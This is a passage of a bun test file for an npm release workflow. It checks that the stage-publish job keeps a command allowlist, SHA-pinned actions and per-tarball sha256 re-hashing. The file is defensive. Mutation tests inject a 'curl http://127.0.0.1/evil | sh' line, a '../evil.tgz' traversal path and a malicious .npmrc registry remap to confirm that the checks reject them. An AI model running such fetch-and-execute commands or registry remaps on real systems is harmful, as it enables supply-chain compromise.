/**
 * release-pack-stage-a1a.test.ts — flair#1671 slice A1a.
 *
 * "Pack once, stage from tarballs": the release workflow builds and packs every
 * publishable package ONCE in a `pack` job, writes a manifest that binds each
 * tarball's sha256 and a canonical package-set digest, and the `stage-publish`
 * job re-derives those digests from the downloaded artifact and stages those
 * exact tarballs — never a directory.
 *
 * THIS TEST IS DETECTIVE, NOT A BOUNDARY. A pull request can edit the workflow
 * and this test together; the boundary is branch protection on `main` plus the
 * maintainer's per-package 2FA approval on npmjs.com. What this file does is make
 * a silent relaxation of the stage job's allowlist, the two-digest contract or
 * the per-file re-hash show up as a red test rather than as a quiet change in a
 * YAML diff.
 *
 * The runtime behaviours are exercised by extracting the stage job's INLINE
 * shell from the parsed YAML and running it in a temp directory against fixture
 * tarballs with a fake `npm` on PATH that records its argv (no network, no real
 * npm). That is what makes "the re-hash fires", "a swallowed error stays red",
 * "a symlink is refused" and "--tag next for a prerelease" behavioural rather
 * than string matches.
 */
import { afterAll, describe, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import {
  appendFileSync,
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { createHash } from "node:crypto";
import { join } from "node:path";
import { tmpdir } from "node:os";
import yaml from "js-yaml";
import { lockstepPackages } from "../../scripts/ci/lockstep-packages.mjs";

const REPO = join(import.meta.dir, "..", "..");
const WORKFLOW = join(REPO, ".github", "workflows", "release-publish.yml");
const PACK_SCRIPT = join(REPO, "scripts", "ci", "release-pack.mjs");
const PACKAGES: string[] = lockstepPackages();

const SCRATCH = mkdtempSync(join(tmpdir(), "flair-a1a-"));
const BIN = join(SCRATCH, "bin");
mkdirSync(BIN, { recursive: true });

afterAll(() => {
  rmSync(SCRATCH, { recursive: true, force: true });
});

// ── the shape checker, usable on the real file and on mutants ────────────────

const SHA40 = /^[0-9a-f]{40}$/;
/** Simple-command words the stage job's run bodies may use. */
const ALLOWED = new Set([
  "set", "cd", "mkdir", "printf", "echo", "exit", "npm", "jq", "sha256sum",
  "sort", "cmp", "chmod", "git", "find", "while", "read", "do", "done", "for", "in", "if", "then",
  "else", "fi", "[", ":", "continue", "break",
]);
/** Leading words that are structural, not commands. */
const KEYWORD_STRIP = ["if", "then", "else", "elif", "while", "for", "until", "do", "!"];
const BARE_KEYWORDS = new Set(["done", "fi", "esac", "then", "else", "do", ";;"]);

function stripQuoted(s: string): string {
  return s.replace(/'[^']*'/g, "").replace(/"[^"]*"/g, "");
}

/** Blank out `$( ... )` (balanced) and `$(( ... ))`, collecting the inner text. */
function extractSubstitutions(s: string): { text: string; subs: string[] } {
  const subs: string[] = [];
  let out = "";
  for (let i = 0; i < s.length; i++) {
    if (s[i] === "$" && s[i + 1] === "(" && s[i + 2] === "(") {
      let depth = 0;
      let j = i + 1;
      for (; j < s.length; j++) {
        if (s[j] === "(") depth++;
        else if (s[j] === ")") {
          depth--;
          if (depth === 0) break;
        }
      }
      out += "ARITH";
      i = j;
      continue;
    }
    if (s[i] === "$" && s[i + 1] === "(") {
      let depth = 0;
      let j = i + 1;
      for (; j < s.length; j++) {
        if (s[j] === "(") depth++;
        else if (s[j] === ")") {
          depth--;
          if (depth === 0) break;
        }
      }
      subs.push(s.slice(i + 2, j));
      out += "SUBST";
      i = j;
      continue;
    }
    out += s[i];
  }
  return { text: out, subs };
}

/** The command word AND the remaining quote-stripped statement, or null. */
function commandStatement(fragment: string): { cmd: string; stmt: string } | null {
  let s = fragment.trim();
  if (!s || s.startsWith("#")) return null;
  if (s.startsWith("}")) return null; // closing brace of a step-summary group
  if (/^for\b/.test(s)) return null; // a loop header is not a command
  while (s.startsWith("(") || s.startsWith("{")) s = s.slice(1).trim();
  let changed = true;
  while (changed) {
    changed = false;
    for (const kw of KEYWORD_STRIP) {
      const re = kw === "!" ? /^!\s*/ : new RegExp(`^${kw}\\b\\s*`);
      if (re.test(s)) {
        s = s.replace(re, "");
        changed = true;
      }
    }
    const asg = /^[A-Za-z_][A-Za-z0-9_]*=/.exec(s);
    if (asg) {
      let rest = s.slice(asg[0].length);
      if (rest.startsWith("${")) {
        let depth = 0;
        let j = 0;
        for (; j < rest.length; j++) {
          if (rest[j] === "{") depth++;
          else if (rest[j] === "}") {
            depth--;
            if (depth === 0) break;
          }
        }
        rest = rest.slice(j + 1);
      } else {
        rest = rest.replace(/^\S+/, "");
      }
      s = rest.trim();
      changed = true;
    }
  }
  if (!s) return null;
  const token = s.split(/\s+/)[0];
  if (token.startsWith("$") || token === "SUBST" || token === "ARITH") return null;
  return { cmd: token, stmt: s };
}

function leadingCommand(fragment: string): string | null {
  return commandStatement(fragment)?.cmd ?? null;
}

/** Allowed npm invocations: exact shapes only, every one carrying --userconfig. */
function npmInvocationProblem(stmt: string, raw: string): string | null {
  if (/^npm install -g npm@\d+\.\d+\.\d+\b/.test(stmt)) {
    return /\s--userconfig\b/.test(stmt) ? null : "npm install must carry --userconfig";
  }
  if (/^npm --version\b/.test(stmt)) {
    return /\s--userconfig\b/.test(stmt) ? null : "npm --version must carry --userconfig";
  }
  if (/^npm stage publish\s/.test(stmt)) {
    // The tag value may only enter as the quoted variable the tag= scan already
    // constrains to staged|next — never a literal.
    if (!/--tag\s+"\$[A-Za-z_][A-Za-z0-9_]*"/.test(raw)) {
      return 'npm stage publish must carry --tag as a quoted variable, e.g. --tag "$tag"';
    }
    if (!/\s--ignore-scripts\b/.test(stmt)) return "npm stage publish must carry --ignore-scripts";
    if (!/\s--userconfig\b/.test(stmt)) return "npm stage publish must carry --userconfig";
    return null;
  }
  return `unexpected npm invocation: ${stmt.split(/\s+/).slice(0, 3).join(" ")}`;
}

/** Allowed git invocations: the ancestry check, and nothing else. */
function gitInvocationProblem(stmt: string): string | null {
  if (/^git fetch --no-tags origin main\b/.test(stmt)) return null;
  if (/^git merge-base --is-ancestor \S+ origin\/main\b/.test(stmt)) return null;
  return `unexpected git invocation: ${stmt.split(/\s+/).slice(0, 3).join(" ")}`;
}

function splitStatements(line: string): string[] {
  return line.split(/\|\||&&|;|\|/);
}

/** Split on unquoted `;`, `&&`, `||`, `|` — quotes (and any `|` inside them) are preserved. */
function splitStatementsQuoted(line: string): string[] {
  const out: string[] = [];
  let cur = "";
  let quote: string | null = null;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i]!;
    if (quote) {
      cur += ch;
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      cur += ch;
      continue;
    }
    const two = line.slice(i, i + 2);
    if (two === "&&" || two === "||") {
      out.push(cur);
      cur = "";
      i++;
      continue;
    }
    if (ch === ";" || ch === "|") {
      out.push(cur);
      cur = "";
      continue;
    }
    cur += ch;
  }
  out.push(cur);
  return out;
}

/** The statement with quote CHARACTERS removed but their content kept. */
function unquoteStatement(fragment: string): string {
  return commandStatement(fragment.replace(/['"]/g, ""))?.stmt ?? "";
}

/** Problems in one run body: eval, backticks, repository code, commands off the set. */
function runBodyProblems(runBody: string): string[] {
  const problems: string[] = [];
  if (/\beval\b/.test(runBody)) problems.push("run body contains eval");
  if (runBody.includes("`")) problems.push("run body contains a backtick");
  if (/\bnode\b/.test(runBody) || runBody.includes("scripts/")) {
    problems.push("run body references repository code (node / scripts/)");
  }
  const { text, subs } = extractSubstitutions(runBody);
  for (const inner of subs) {
    const cmd = leadingCommand(stripQuoted(inner));
    if (cmd && !ALLOWED.has(cmd)) problems.push(`command substitution outside the set: $(${cmd} …)`);
  }
  for (const rawLine of text.split("\n")) {
    if (/^\s*#/.test(rawLine)) continue;
    for (const frag of splitStatementsQuoted(rawLine)) {
      const cs = commandStatement(stripQuoted(frag));
      if (!cs) continue;
      if (!ALLOWED.has(cs.cmd) && !BARE_KEYWORDS.has(cs.cmd)) {
        problems.push(`command outside the set: ${cs.cmd}`);
      }
      if (cs.cmd === "npm") {
        const p = npmInvocationProblem(unquoteStatement(frag), frag);
        if (p) problems.push(p);
      }
      if (cs.cmd === "git") {
        const p = gitInvocationProblem(unquoteStatement(frag));
        if (p) problems.push(p);
      }
    }
  }
  // The staging tag is a variable; it may only ever be given the two allowed values.
  // Quoted values are matched too, so `tag="latest"` cannot slip past.
  for (const m of runBody.matchAll(/\btag=(["']?)([^"'\s;]*)\1/g)) {
    if (m[2] !== "staged" && m[2] !== "next") problems.push(`tag must be staged or next, got tag=${m[2]}`);
  }
  return problems;
}

interface StageStep {
  name?: string;
  uses?: string;
  run?: string;
  with?: Record<string, unknown>;
  id?: string;
}
interface WorkflowDoc {
  permissions?: unknown;
  jobs?: Record<string, { permissions?: Record<string, string>; environment?: string; steps?: StageStep[] }>;
}

/** The full stage-job contract. Returns human-readable problems ([] is good). */
export function inspectStageJob(text: string): { problems: string[] } {
  const problems: string[] = [];
  const doc = yaml.load(text) as WorkflowDoc | null;
  if (!doc || typeof doc !== "object") return { problems: ["workflow is not a mapping"] };

  const wfPerm = doc.permissions;
  if (!wfPerm || typeof wfPerm !== "object" || Object.keys(wfPerm as object).length !== 0) {
    problems.push("workflow-level permissions must be {} (opt in per job)");
  }

  const stage = doc.jobs?.["stage-publish"];
  if (!stage) return { problems: [...problems, "no stage-publish job"] };

  const perms = stage.permissions ?? {};
  const permPairs = Object.entries(perms).sort();
  const want = [["contents", "read"], ["id-token", "write"]];
  if (JSON.stringify(permPairs) !== JSON.stringify(want)) {
    problems.push(`stage-publish permissions must be exactly contents: read + id-token: write, got ${JSON.stringify(perms)}`);
  }
  if (stage.environment !== "release") problems.push("stage-publish must keep environment: release (OIDC scoping)");

  const steps = stage.steps ?? [];
  if (steps.length !== 6) problems.push(`stage-publish must have exactly 6 allowlisted steps, got ${steps.length}`);
  const [checkout, ancestry, setupNode, upgrade, download, stageStep] = steps;

  if (!checkout || !/^actions\/checkout@[0-9a-f]{40}$/.test(checkout.uses ?? "")) {
    problems.push("step 1 must be a SHA-pinned actions/checkout");
  } else if (checkout.with?.["persist-credentials"] !== false) {
    problems.push("the stage checkout must set persist-credentials: false");
  }

  if (
    !ancestry?.run ||
    !/git fetch --no-tags origin main/.test(ancestry.run) ||
    !/git merge-base --is-ancestor/.test(ancestry.run)
  ) {
    problems.push("step 2 must be the ancestry check (git fetch --no-tags origin main; git merge-base --is-ancestor)");
  }

  if (!setupNode || !/^actions\/setup-node@[0-9a-f]{40}$/.test(setupNode.uses ?? "")) {
    problems.push("step 3 must be a SHA-pinned actions/setup-node");
  } else if (setupNode.with && "registry-url" in setupNode.with) {
    problems.push("setup-node must NOT set registry-url");
  }

  if (!upgrade?.run || !/npm install -g npm@\d+\.\d+\.\d+/.test(upgrade.run)) {
    problems.push("step 4 must self-upgrade npm to an EXACT version (npm install -g npm@X.Y.Z)");
  } else if (/npm@[\^~]/.test(upgrade.run)) {
    problems.push("the npm self-upgrade must not use a range");
  }

  if (!download || !/^actions\/download-artifact@[0-9a-f]{40}$/.test(download.uses ?? "")) {
    problems.push("step 5 must be a SHA-pinned actions/download-artifact");
  } else if (!download.with || !("artifact-ids" in download.with)) {
    problems.push("download-artifact must be driven by artifact-ids");
  } else if (download.with["merge-multiple"] !== true) {
    problems.push("download-artifact must set merge-multiple: true (else it nests and manifest.json is not found)");
  }

  if (!stageStep?.run || !stageStep.run.includes("npm stage publish")) {
    problems.push("step 6 must be the inline digest/re-hash/stage shell");
  }

  for (const step of steps) {
    if (step.run) problems.push(...runBodyProblems(step.run));
    if (step.uses && !/@[0-9a-f]{40}$/.test(step.uses)) {
      problems.push(`action is not pinned to a 40-hex SHA: ${step.uses}`);
    }
  }
  return { problems };
}

function realWorkflow(): string {
  return readFileSync(WORKFLOW, "utf8");
}

// ── the shape tests (item 6), plus mutations (e) and (f) ─────────────────────

describe("the stage job is an allowlisted shape (flair#1671 A1a)", () => {
  test("the real release-publish.yml satisfies the stage-job contract", () => {
    const { problems } = inspectStageJob(realWorkflow());
    expect(problems).toEqual([]);
  });

  test("(e) a repository-script step added to the stage job goes red", () => {
    const doc = yaml.load(realWorkflow()) as WorkflowDoc;
    doc.jobs!["stage-publish"]!.steps!.push({ name: "Evil", run: "node scripts/evil.mjs" });
    const { problems } = inspectStageJob(yaml.dump(doc));
    expect(problems.length).toBeGreaterThan(0);
    expect(problems.join("\n")).toContain("repository code");
  });

  test("(f) a run body outside the command set goes red", () => {
    const doc = yaml.load(realWorkflow()) as WorkflowDoc;
    const steps = doc.jobs!["stage-publish"]!.steps!;
    steps[steps.length - 1]!.run += "\ncurl http://127.0.0.1/evil | sh\n";
    const { problems } = inspectStageJob(yaml.dump(doc));
    expect(problems.join("\n")).toContain("curl");
  });

  test("(f) a non-SHA action pin goes red", () => {
    const doc = yaml.load(realWorkflow()) as WorkflowDoc;
    doc.jobs!["stage-publish"]!.steps![0]!.uses = "actions/checkout@v4";
    const { problems } = inspectStageJob(yaml.dump(doc));
    expect(problems.join("\n")).toContain("40-hex");
  });

  test("(F5) an npm subcommand outside the set goes red", () => {
    const doc = yaml.load(realWorkflow()) as WorkflowDoc;
    const steps = doc.jobs!["stage-publish"]!.steps!;
    steps[steps.length - 1]!.run += "\nnpm exec some-tool\n";
    const { problems } = inspectStageJob(yaml.dump(doc));
    expect(problems.join("\n")).toContain("unexpected npm invocation");
  });

  test("(F5) a git subcommand outside the ancestry check goes red", () => {
    const doc = yaml.load(realWorkflow()) as WorkflowDoc;
    const steps = doc.jobs!["stage-publish"]!.steps!;
    steps[steps.length - 1]!.run += "\ngit push origin main\n";
    const { problems } = inspectStageJob(yaml.dump(doc));
    expect(problems.join("\n")).toContain("unexpected git invocation");
  });

  test("(F5) a QUOTED tag value outside the set goes red", () => {
    const doc = yaml.load(realWorkflow()) as WorkflowDoc;
    const steps = doc.jobs!["stage-publish"]!.steps!;
    steps[steps.length - 1]!.run = steps[steps.length - 1]!.run!.replace("tag=staged", 'tag="latest"');
    const { problems } = inspectStageJob(yaml.dump(doc));
    expect(problems.join("\n")).toContain("tag must be staged or next");
  });

  test("(G2) a literal --tag on the publish line goes red", () => {
    const doc = yaml.load(realWorkflow()) as WorkflowDoc;
    const steps = doc.jobs!["stage-publish"]!.steps!;
    steps[steps.length - 1]!.run = steps[steps.length - 1]!.run!.replace('--tag "$tag"', "--tag latest");
    const { problems } = inspectStageJob(yaml.dump(doc));
    expect(problems.join("\n")).toContain("quoted variable");
  });

  test("workflow-level permissions are {} and github-release keeps contents: write", () => {
    const doc = yaml.load(realWorkflow()) as WorkflowDoc;
    expect(Object.keys(doc.permissions as object)).toEqual([]);
    expect(doc.jobs!["pack"]!.permissions).toEqual({ contents: "read" });
    expect(doc.jobs!["github-release"]!.permissions).toEqual({ contents: "write" });
  });
});

// ── extracting and running the inline stage shell (the runtime behaviours) ───

function stageStageShell(text: string): string {
  const doc = yaml.load(text) as WorkflowDoc;
  const step = (doc.jobs!["stage-publish"]!.steps ?? []).find(
    (s) => typeof s.run === "string" && s.run.includes("npm stage publish"),
  );
  if (!step?.run) throw new Error("release-publish.yml has no stage-publish run step");
  return step.run;
}

function sha256Hex(input: Buffer | string): string {
  return createHash("sha256").update(input).digest("hex");
}

function tarballBasename(name: string, version: string): string {
  const stem = name.startsWith("@") ? name.slice(1).replace("/", "-") : name;
  return `${stem}-${version}.tgz`;
}

interface Artifact {
  packages: { name: string; version: string; basename: string; size: number; sha256: string }[];
  packageSetDigest: string;
  manifestDigest: string;
}

/** Build fixture tarballs + a manifest exactly as the pack script does. */
function buildArtifact(dir: string, version: string, names: string[]): Artifact {
  mkdirSync(dir, { recursive: true });
  const packages = names
    .map((name) => {
      const basename = tarballBasename(name, version);
      const bytes = Buffer.from(`tarball:${name}@${version}`);
      writeFileSync(join(dir, basename), bytes);
      return { name, version, basename, size: bytes.length, sha256: sha256Hex(bytes) };
    })
    .sort((a, b) => (a.name < b.name ? -1 : a.name > b.name ? 1 : 0));
  const lines = packages.map((p) => `${p.name}@${p.version} ${p.sha256}`).sort().join("\n") + "\n";
  const packageSetDigest = sha256Hex(Buffer.from(lines));
  const manifest = { schema: 1, version, packages, packageSetDigest };
  const bytes = Buffer.from(JSON.stringify(manifest, null, 2) + "\n");
  writeFileSync(join(dir, "manifest.json"), bytes);
  return { packages, packageSetDigest, manifestDigest: sha256Hex(bytes) };
}

/** A fake npm that records its argv and cwd, with optional mutation/failure hooks. */
function installFakeNpm(): string {
  const script = `#!/usr/bin/env node
const fs = require("node:fs");
const args = process.argv.slice(2);
if (process.env.NPM_LOG) fs.appendFileSync(process.env.NPM_LOG, JSON.stringify({ argv: args, cwd: process.cwd() }) + "\\n");
const ucIdx = args.indexOf("--userconfig");
if (args[0] === "config" && args[1] === "get" && args[2] === "registry") {
  let line = "(no-userconfig)";
  if (ucIdx !== -1) {
    const uc = String(fs.readFileSync(args[ucIdx + 1], "utf8")).split("\\n").find((l) => l.startsWith("registry="));
    if (uc) line = uc.slice("registry=".length);
  }
  process.stdout.write(line + "\\n");
  process.exit(0);
}
const joined = args.join(" ");
if (process.env.NPM_FAIL_ON && joined.includes(process.env.NPM_FAIL_ON)) process.exit(1);
if (process.env.NPM_MUTATE_ON && joined.includes(process.env.NPM_MUTATE_ON)) {
  // The tarballs are chmod-read-only by the shell; removing and rewriting is
  // how a same-user tamperer would have to do it, and it still changes bytes.
  const target = process.env.NPM_MUTATE_FILE;
  fs.rmSync(target, { force: true });
  fs.writeFileSync(target, "corrupted");
}
process.exit(0);
`;
  const path = join(BIN, "npm");
  writeFileSync(path, script);
  chmodSync(path, 0o755);
  return path;
}

interface RunResult {
  status: number | null;
  out: string;
  log: { argv: string[]; cwd: string }[];
  scratch: string;
  userconfig: string;
}

function runStageShell(
  artifact: Artifact,
  artDir: string,
  envExtra: Record<string, string> = {},
  scratchFiles: Record<string, string> = {},
): RunResult {
  installFakeNpm();
  const scratch = mkdtempSync(join(SCRATCH, "run-"));
  const sh = join(scratch, "stage.sh");
  writeFileSync(sh, stageStageShell(realWorkflow()));
  const summary = join(scratch, "summary.md");
  writeFileSync(summary, "");
  const userconfig = join(scratch, "npm-userconfig");
  writeFileSync(userconfig, "registry=https://registry.npmjs.org/\n");
  const workDir = join(scratch, "work");
  mkdirSync(workDir, { recursive: true });
  for (const [rel, content] of Object.entries(scratchFiles)) writeFileSync(join(scratch, rel), content);
  const log = join(scratch, "npm.log");
  writeFileSync(log, "");
  const r = spawnSync("bash", [sh], {
    cwd: scratch,
    encoding: "utf8",
    env: {
      ...process.env,
      PATH: `${BIN}:${process.env.PATH}`,
      ART_DIR: artDir,
      NPM_USERCONFIG: userconfig,
      WORK_DIR: workDir,
      PACK_PACKAGE_SET_DIGEST: artifact.packageSetDigest,
      PACK_MANIFEST_DIGEST: artifact.manifestDigest,
      GITHUB_STEP_SUMMARY: summary,
      NPM_LOG: log,
      ...envExtra,
    },
  });
  const records = readFileSync(log, "utf8")
    .split("\n")
    .filter(Boolean)
    .map((l) => JSON.parse(l) as { argv: string[]; cwd: string });
  return { status: r.status, out: `${r.stdout ?? ""}${r.stderr ?? ""}`, log: records, scratch, userconfig };
}

const VERSION = "0.55.2";
const FIXTURE_NAMES = PACKAGES.slice(0, 3); // three real lockstep names

describe("stage-publish stages the exact tarballs it re-derives (flair#1671 A1a)", () => {
  test("positive control: a clean artifact stages every package under --tag staged", () => {
    const dir = mkdtempSync(join(SCRATCH, "clean-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    const r = runStageShell(artifact, dir);
    expect(r.status).toBe(0);
    const publishes = r.log.filter((l) => l.argv[0] === "stage" && l.argv[1] === "publish");
    expect(publishes.length).toBe(FIXTURE_NAMES.length);
    for (const p of publishes) expect(p.argv).toContain("--tag");
    expect(r.log.every((l) => l.cwd === dir)).toBe(true);
  });

  test("(j) a prerelease version stages with --tag next; a stable one with --tag staged", () => {
    const stableDir = mkdtempSync(join(SCRATCH, "stable-"));
    const stable = buildArtifact(stableDir, VERSION, FIXTURE_NAMES);
    const stableRun = runStageShell(stable, stableDir);
    expect(stableRun.status).toBe(0);
    for (const p of stableRun.log.filter((l) => l.argv[0] === "stage")) {
      expect(p.argv[p.argv.indexOf("--tag") + 1]).toBe("staged");
    }

    const preDir = mkdtempSync(join(SCRATCH, "pre-"));
    const pre = buildArtifact(preDir, "0.55.2-qualify.1", FIXTURE_NAMES);
    const preRun = runStageShell(pre, preDir);
    expect(preRun.status).toBe(0);
    const prePublishes = preRun.log.filter((l) => l.argv[0] === "stage");
    expect(prePublishes.length).toBe(FIXTURE_NAMES.length);
    for (const p of prePublishes) {
      expect(p.argv[p.argv.indexOf("--tag") + 1]).toBe("next");
    }
  });

  test("(i) a staging error is NOT swallowed, and a sent request is INCOMPLETE, never 'nothing staged'", () => {
    const dir = mkdtempSync(join(SCRATCH, "fail-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    const r = runStageShell(artifact, dir, { NPM_FAIL_ON: artifact.packages[0]!.basename });
    expect(r.status).not.toBe(0);
    // A request was SENT, so its outcome is unknown: INCOMPLETE, APPROVE NOTHING.
    expect(r.out).toContain("INCOMPLETE");
    expect(r.out).toContain("APPROVE NOTHING");
    expect(r.out).not.toContain("nothing staged");
    // Only the failing call was attempted; nothing after it.
    expect(r.log.filter((l) => l.argv[0] === "stage").length).toBe(1);
    // The INCOMPLETE summary lands in the job summary too.
    const summary = readFileSync(join(r.scratch, "summary.md"), "utf8");
    expect(summary).toContain("INCOMPLETE: APPROVE NOTHING");
    expect(summary).toContain("package-set digest:");
    expect(summary).toContain("manifest digest:");
    expect(summary).toContain("not attempted:");
  });

  test("(b) a tarball mutated after the digest check is refused on the per-file re-hash", () => {
    const dir = mkdtempSync(join(SCRATCH, "mutate-"));
    // Names are sorted by the manifest; mutate the LAST one while staging the
    // FIRST, so the pre-stage set digest has already passed.
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    const first = artifact.packages[0]!.basename;
    const last = artifact.packages[artifact.packages.length - 1]!.basename;
    const r = runStageShell(artifact, dir, {
      NPM_MUTATE_ON: first,
      NPM_MUTATE_FILE: join(dir, last),
    });
    expect(r.status).not.toBe(0);
    expect(r.out).toContain("re-hash");
    expect(r.out).toContain("INCOMPLETE");
    // The first package was staged; the mutated one was NOT.
    const staged = r.log.filter((l) => l.argv[0] === "stage").map((l) => l.argv.join(" "));
    expect(staged.some((s) => s.includes(first))).toBe(true);
    expect(staged.some((s) => s.includes(last))).toBe(false);
  });

  test("(h) an artifact with a symlink is refused before any stage request", () => {
    const dir = mkdtempSync(join(SCRATCH, "symlink-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    // Replace one tarball with a symlink to another file.
    const victim = join(dir, artifact.packages[0]!.basename);
    rmSync(victim);
    symlinkSync(join(dir, artifact.packages[1]!.basename), victim);
    expect(lstatSync(victim).isSymbolicLink()).toBe(true);
    const r = runStageShell(artifact, dir);
    expect(r.status).not.toBe(0);
    expect(r.out).toContain("symlink");
    expect(r.log.filter((l) => l.argv[0] === "stage").length).toBe(0);
  });

  test("(h) an artifact whose manifest names a ../ path is refused before any stage request", () => {
    const dir = mkdtempSync(join(SCRATCH, "escape-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    const manifestPath = join(dir, "manifest.json");
    const manifest = JSON.parse(readFileSync(manifestPath, "utf8")) as {
      packages: { basename: string }[];
    };
    manifest.packages[0]!.basename = "../evil.tgz";
    const bytes = Buffer.from(JSON.stringify(manifest, null, 2) + "\n");
    writeFileSync(manifestPath, bytes);
    // Recompute the manifest digest so we reach the basename check, not the digest gate.
    artifact.manifestDigest = sha256Hex(bytes);
    const r = runStageShell(artifact, dir);
    expect(r.status).not.toBe(0);
    expect(r.out).toContain("unsafe basename");
    expect(r.log.filter((l) => l.argv[0] === "stage").length).toBe(0);
  });

  test("(g) a candidate workspace .npmrc is inert — the job userconfig is used for every npm call", () => {
    const dir = mkdtempSync(join(SCRATCH, "npmrc-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    // A registry remap in the working directory the job starts from.
    const r = runStageShell(artifact, dir, {}, { ".npmrc": "registry=http://evil.example/\n" });
    expect(r.status).toBe(0);
    const publishes = r.log.filter((l) => l.argv[0] === "stage");
    expect(publishes.length).toBe(FIXTURE_NAMES.length);
    for (const p of publishes) {
      const idx = p.argv.indexOf("--userconfig");
      expect(idx).toBeGreaterThan(-1);
      expect(p.argv[idx + 1]).toBe(r.userconfig); // the job userconfig, not the workspace .npmrc
    }
    // And that userconfig resolves to the public registry, not the remap.
    const cfg = spawnSync(
      join(BIN, "npm"),
      ["config", "get", "registry", "--userconfig", r.userconfig],
      { encoding: "utf8", env: { ...process.env, NPM_LOG: join(r.scratch, "cfg.log") } },
    );
    expect(cfg.status).toBe(0);
    expect(cfg.stdout.trim()).toBe("https://registry.npmjs.org/");
  });

  test("(F4) an unexpected file in the artifact (a shipped .npmrc) is refused before any stage request", () => {
    const dir = mkdtempSync(join(SCRATCH, "extra-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    writeFileSync(join(dir, ".npmrc"), "registry=http://evil.example/\n");
    const r = runStageShell(artifact, dir);
    expect(r.status).not.toBe(0);
    expect(r.out).toContain("does not hold exactly manifest.json");
    expect(r.log.filter((l) => l.argv[0] === "stage").length).toBe(0);
  });

  test("(G1) an entry named ..hidden is refused before any stage request", () => {
    const dir = mkdtempSync(join(SCRATCH, "dotdot-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    writeFileSync(join(dir, "..hidden"), "x");
    const r = runStageShell(artifact, dir);
    expect(r.status).not.toBe(0);
    expect(r.out).toContain("does not hold exactly manifest.json");
    expect(r.log.filter((l) => l.argv[0] === "stage").length).toBe(0);
  });

  test("(G1) a DANGLING symlink is refused before any stage request", () => {
    const dir = mkdtempSync(join(SCRATCH, "dangling-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    symlinkSync(join(dir, "no-such-target"), join(dir, "dangling.tgz"));
    expect(lstatSync(join(dir, "dangling.tgz")).isSymbolicLink()).toBe(true);
    const r = runStageShell(artifact, dir);
    expect(r.status).not.toBe(0);
    // The artifact hygiene check names it, before any digest/chmod work.
    expect(r.out).toContain("release artifact contains a symlink");
    expect(r.log.filter((l) => l.argv[0] === "stage").length).toBe(0);
  });

  test("(F7) the download step merges into one directory; a nested artifact is refused", () => {
    const doc = yaml.load(realWorkflow()) as WorkflowDoc;
    const step = doc.jobs!["stage-publish"]!.steps!.find((s) => /download-artifact/.test(s.uses ?? ""));
    expect(step?.with?.["merge-multiple"]).toBe(true);
    // Without merge-multiple the real action nests the files under the artifact
    // name; the shell then cannot find manifest.json and refuses.
    const parent = mkdtempSync(join(SCRATCH, "nested-"));
    const artifact = buildArtifact(join(parent, "release-tarballs"), VERSION, FIXTURE_NAMES);
    const r = runStageShell(artifact, parent);
    expect(r.status).not.toBe(0);
    expect(r.out).toContain("manifest.json");
    expect(r.log.filter((l) => l.argv[0] === "stage").length).toBe(0);
  });

  test("(F3c) the recomputed package-set digest must equal the manifest's own field as well as pack's", () => {
    const dir = mkdtempSync(join(SCRATCH, "setfield-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    const manifestPath = join(dir, "manifest.json");
    const manifest = JSON.parse(readFileSync(manifestPath, "utf8")) as { packageSetDigest: string };
    manifest.packageSetDigest = "0".repeat(64);
    const bytes = Buffer.from(JSON.stringify(manifest, null, 2) + "\n");
    writeFileSync(manifestPath, bytes);
    artifact.manifestDigest = sha256Hex(bytes); // pass the manifest-digest gate, fail the field check
    const r = runStageShell(artifact, dir);
    expect(r.status).not.toBe(0);
    expect(r.out).toContain("differs from the manifest field");
    expect(r.log.filter((l) => l.argv[0] === "stage").length).toBe(0);
  });

  test("(F2) the success summary carries the canary / promote / deprecate operator instructions and the flair sha", () => {
    const dir = mkdtempSync(join(SCRATCH, "summary-"));
    const artifact = buildArtifact(dir, VERSION, PACKAGES);
    const r = runStageShell(artifact, dir);
    expect(r.status).toBe(0);
    const summary = readFileSync(join(r.scratch, "summary.md"), "utf8");
    expect(summary).toContain("post-publish canary");
    expect(summary).toContain("sha256");
    expect(summary).toContain("promote command");
    expect(summary).toContain("deprecate");
    expect(summary).toContain("2FA");
    const flair = artifact.packages.find((p) => p.name === "@tpsdev-ai/flair");
    expect(flair).toBeTruthy();
    expect(summary).toContain("flair tarball sha256");
    expect(summary).toContain(flair!.sha256);
  });
});

// ── the pack script: exact pins and the tarball set (items 1 & 2) ─────────────

function writeFakePackNpm(): void {
  const script = `#!/usr/bin/env node
const fs = require("node:fs");
const path = require("node:path");
const args = process.argv.slice(2);
if (args[0] === "--version") { process.stdout.write("11.20.0\\n"); process.exit(0); }
const dest = args[args.indexOf("--pack-destination") + 1];
const pkg = JSON.parse(fs.readFileSync(path.join(process.cwd(), "package.json"), "utf8"));
const stem = pkg.name.startsWith("@") ? pkg.name.slice(1).replace("/", "-") : pkg.name;
const filename = stem + "-" + pkg.version + ".tgz";
if (process.env.NPM_PACK_SKIP === pkg.name) {
  process.stdout.write(JSON.stringify([]) + "\\n");
  process.exit(0);
}
fs.writeFileSync(path.join(dest, filename), "tarball:" + pkg.name + "@" + pkg.version);
process.stdout.write(JSON.stringify([{ filename }]) + "\\n");
process.exit(0);
`;
  const path = join(BIN, "npm");
  writeFileSync(path, script);
  chmodSync(path, 0o755);
}

interface PackFixture {
  dir: string;
  dirs: string[];
}

/** A minimal publishable workspace: root + packages/<name>. */
function makePackFixture(opts: {
  version: string;
  packages: Record<string, { private?: boolean; deps?: Record<string, string>; name?: string }>;
  rootVersion?: string;
}): PackFixture {
